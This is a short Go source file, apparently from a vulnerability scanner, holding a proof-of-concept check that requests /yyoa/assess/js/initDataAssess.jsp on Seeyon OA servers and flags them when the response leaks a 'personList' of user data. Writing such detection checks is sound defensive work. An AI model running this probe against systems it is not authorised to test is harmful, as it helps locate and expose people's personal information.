package seeyon

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

// initDataAssess.jsp 用户敏感信息泄露

func InitDataAssess(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/yyoa/assess/js/initDataAssess.jsp", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "personList") {
			return true
		}
	}
	return false
}
